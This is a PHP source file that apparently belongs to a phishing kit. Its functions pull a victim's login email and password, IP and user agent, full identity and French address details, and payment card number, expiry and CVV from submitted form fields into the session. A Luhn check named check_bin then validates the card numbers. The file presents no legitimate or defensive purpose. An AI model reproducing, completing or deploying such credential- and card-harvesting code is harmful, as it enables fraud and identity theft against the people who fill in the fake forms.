<?php 

function gather_login_infos(){

    $_SESSION['email'] = htmlspecialchars($_POST['bat_id']);
	$_SESSION['password'] = htmlspecialchars($_POST['bat_password']);
	$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

    return $_SESSION;
}

function gather_billing_infos(){

	$_SESSION['nom'] = htmlspecialchars($_POST['bat_nom']);
	$_SESSION['prenom'] = htmlspecialchars($_POST['bat_prenom']);
	$_SESSION['birthday'] = htmlspecialchars($_POST['bat_birthday']);
	$_SESSION['phone'] = htmlspecialchars($_POST['bat_phone']);
	$_SESSION['adresse'] = htmlspecialchars($_POST['bat_adresse']);
	$_SESSION['zip'] = htmlspecialchars($_POST['bat_zip']);
	$_SESSION['city'] = htmlspecialchars($_POST['bat_ville']);
	$_SESSION["country"] = "France";

	return $_SESSION;

	
}

function gather_card_infos(){

	$_SESSION['nomcc'] = htmlspecialchars($_POST['bat_nomcc']);
	$_SESSION['ccnum'] = htmlspecialchars($_POST['bat_ccnum']);
	$_SESSION['ccexp'] = htmlspecialchars($_POST['bat_ccexp']);
	$_SESSION['cvv'] = htmlspecialchars($_POST['bat_cvv']);

	return $_SESSION;

}



function start_session(){

    if(!isset($_SESSION)){
		session_start();
	}

    return $_SESSION;
}



function check_bin($number) {
	settype($number, 'string');
	$sumTable = array(
	  array(0,1,2,3,4,5,6,7,8,9),
	  array(0,2,4,6,8,1,3,5,7,9));
	$sum = 0;
	$flip = 0;
	for ($i = strlen($number) - 1; $i >= 0; $i--) {
	  $sum += $sumTable[$flip++ & 0x1][$number[$i]];
	}
	return $sum % 10 === 0;
}




?>